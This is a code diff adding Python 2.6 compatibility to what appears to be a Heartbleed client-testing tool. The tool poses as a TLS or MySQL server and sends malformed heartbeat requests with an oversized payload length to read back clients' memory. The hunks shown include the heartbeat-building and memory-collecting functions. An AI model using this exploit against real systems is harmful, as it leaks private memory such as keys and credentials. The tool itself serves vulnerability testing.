@@ -3,6 +3,9 @@
 # Author: Peter Wu <peter@lekensteyn.nl>
 # Licensed under the MIT license <http://opensource.org/licenses/MIT>.
 
+# Python 2.6 compatibility
+from __future__ import unicode_literals
+
 try:
     import socketserver
 except:
@@ -91,7 +94,7 @@ def make_hello(sslver, cipher):
     data += ' 00 0f' # Heartbeat type
     data += ' 00 01' # Length
     data += ' 01'    # mode
-    return bytearray.fromhex(unicode(data).replace('\n', ''))
+    return bytearray.fromhex(data.replace('\n', ''))
 
 def make_heartbeat(sslver, payload_len=0xffed):
     data = '18 ' + sslver
@@ -103,7 +106,7 @@ def make_heartbeat(sslver, payload_len=0xffed):
     # heartbeat requests. Therefore request a payload that fits exactly in four
     # records (0x4000 * 4 - 3 - 16 = 0xffed).
     data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
-    return bytearray.fromhex(unicode(data).replace('\n', ''))
+    return bytearray.fromhex(data.replace('\n', ''))
 
 def hexdump(data):
     allzeroes = b'\0' * 16
@@ -126,7 +129,7 @@ class Failure(Exception):
     pass
 
 class RecordParser(object):
-    record_s = struct.Struct('!BHH')
+    record_s = struct.Struct(b'!BHH')
     def __init__(self):
         self.buffer = bytearray()
         self.buffer_len = 0
@@ -214,7 +217,7 @@ def read_hb_response(sock, timeout):
                 if fragment[0:1] != b'\2':
                     raise Failure('Expected Heartbeat in first response')
 
-                hb_len, = struct.unpack_from('!H', fragment, 1)
+                hb_len, = struct.unpack_from(b'!H', fragment, 1)
                 memory += fragment[2:]
             else: # Heartbeat continuation
                 memory += fragment
@@ -281,7 +284,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
 
     def do_serverhello(self):
         # Read TLS record header
-        content_type, ver, rec_len = self.recv_s('>BHH', 'TLS record')
+        content_type, ver, rec_len = self.recv_s(b'>BHH', 'TLS record')
         # Session-ID length (1 byte) starts at offset 38
         self.expect(rec_len >= 39, 'Illegal handshake packet')
         if content_type == 0x80: # SSLv2 (assume length < 256)
@@ -292,15 +295,15 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # Read handshake
         hnd = self.request.recv(rec_len)
         self.expect(len(hnd) == rec_len, 'Unable to read handshake')
-        hnd_type, len_high, len_low, ver = struct.unpack('>BBHH', hnd[:6])
+        hnd_type, len_high, len_low, ver = struct.unpack(b'>BBHH', hnd[:6])
         self.expect(hnd_type == 1, 'Expected Client Hello')
         # hnd[6:6+32] is Random
         off = 6 + 32
-        sid_len, = struct.unpack('B', hnd[off:off+1])
+        sid_len, = struct.unpack(b'B', hnd[off:off+1])
         off += 1 + sid_len # Skip length and SID
         # Enough room for ciphers?
         self.expect(rec_len - off >= 4, 'Illegal handshake packet (2)')
-        ciphers_len = struct.unpack("<H", hnd[off:off+2])
+        ciphers_len = struct.unpack(b'<H', hnd[off:off+2])
         off += 2
         # The first cipher is fine...
         cipher = bytearray(hnd[off:off+2])
@@ -350,7 +353,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         sock.sendall(bytearray.fromhex(greeting.replace('\n', '')))
         print("Server Greeting sent.")
 
-        len_low, len_high, seqid, caps = self.recv_s('<BHBH', 'MySQL handshake')
+        len_low, len_high, seqid, caps = self.recv_s(b'<BHBH', 'MySQL handshake')
         packet_len = (len_high << 8) | len_low
         self.expect(packet_len == 32, 'Expected SSLRequest length == 32')
         self.expect((caps & 0x800), 'Missing Client SSL support')
